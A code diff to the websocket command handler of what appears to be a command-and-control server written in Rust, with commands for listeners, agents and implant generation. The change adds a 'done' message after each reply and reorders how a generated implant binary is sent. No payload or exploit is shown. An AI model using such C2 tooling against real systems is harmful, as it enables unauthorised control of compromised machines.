@@ -128,6 +128,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                 Err(e) => {
                                     error!("{e}");
                                     let _ = socket_lock.send(Message::Text(format!("Error: This URL already exists."))).await;
+                                    let _ = socket_lock.send(Message::Text("done".to_string())).await;
                                     continue;
                                 },
                             }
@@ -148,6 +149,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
 
                             jobs.push(new_job);
                             let _ = socket_lock.send(Message::Text(format!("Listener `{url}` added."))).await;
+                            let _ = socket_lock.send(Message::Text("done".to_string())).await;
 
                         } else if text.starts_with("delete") {
                             let args = match shellwords::split(text.as_str()) {
@@ -166,6 +168,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                 Some(j) => j,
                                 None => {
                                     let _ = socket_lock.send(Message::Text(format!("Listener `{target}` not found."))).await;
+                                    let _ = socket_lock.send(Message::Text("done".to_string())).await;
                                     continue;
                                 }
                             };
@@ -180,6 +183,8 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                 ).await;
                             }
 
+                            let _ = socket_lock.send(Message::Text("done".to_string())).await;
+
                         } else if text.starts_with("start") {
                             let args = match shellwords::split(text.as_str()) {
                                 Ok(args) => { args }
@@ -192,6 +197,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                 Some(j) => j,
                                 None => {
                                     let _ = socket_lock.send(Message::Text(format!("Listener `{target}` not found."))).await;
+                                    let _ = socket_lock.send(Message::Text("done".to_string())).await;
                                     continue;
                                 }
                             };
@@ -203,6 +209,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                             } else {
                                 let _ = socket_lock.send(Message::Text(format!("Listener `{target}` is alread running"))).await;
                             }
+                            let _ = socket_lock.send(Message::Text("done".to_string())).await;
 
                         } else if text.starts_with("stop") {
                             let args = match shellwords::split(text.as_str()) {
@@ -219,6 +226,7 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                 Some(j) => j,
                                 None => {
                                     let _ = socket_lock.send(Message::Text(format!("Listener `{target}` not found."))).await;
+                                    let _ = socket_lock.send(Message::Text("done".to_string())).await;
                                     continue;
                                 }
                             };
@@ -230,16 +238,19 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                             } else {
                                 let _ = socket_lock.send(Message::Text(format!("Listener `{target}` is already stopped."))).await;
                             }
+                            let _ = socket_lock.send(Message::Text("done".to_string())).await;
 
                         } else if text.starts_with("listeners") {
                             let mut jobs = server_lock.jobs.lock().await;
                             let output = format_jobs(&mut jobs);
                             let _ = socket_lock.send(Message::Text(output)).await;
+                            let _ = socket_lock.send(Message::Text("done".to_string())).await;
 
                         } else if text.starts_with("agents") {
                             let mut agents = server_lock.agents.lock().await;
                             let output = format_agents(&mut agents);
                             let _ = socket_lock.send(Message::Text(output)).await;
+                            let _ = socket_lock.send(Message::Text("done".to_string())).await;
 
                         } else if text.starts_with("generate") {
                             let args = match shellwords::split(text.as_str()) {
@@ -265,23 +276,32 @@ async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Ser
                                 i_format.to_string(),
                             ) {
                                 Ok((output, buffer)) => {
-                                    let _ = socket_lock.send(Message::Binary(buffer)).await;
                                     let _ = socket_lock.send(
-                                        Message::Text(format!("Implant generated to `{output}`."))).await;
+                                        Message::Text(format!(
+                                            "generated {}/client/implants/{}",
+                                            server_lock.config.app_dir.display(),
+                                            output.split("/").last().unwrap()
+                                        ))).await;
+                                    let _ = socket_lock.send(Message::Binary(buffer)).await;
+                                    let _ = socket_lock.send(Message::Text("done".to_string())).await;
 
                                 },
                                 Err(e) => {
                                     let _ = socket_lock.send(
                                         Message::Text(format!("Could not generate an imaplant: {e}"))
                                     ).await;
+                                    let _ = socket_lock.send(
+                                        Message::Text("done".to_string())).await;
                                 }
                             }
 
                         } else if text.starts_with("implants") {
                             let _ = socket_lock.send(Message::Text("List implants.".to_string())).await;
+                            let _ = socket_lock.send(Message::Text("done".to_string())).await;
 
                         } else {
                             let _ = socket_lock.send(Message::Text(format!("Unknown command: {text}"))).await;
+                            let _ = socket_lock.send(Message::Text("done".to_string())).await;
                         }
                     }
                     _ => {}
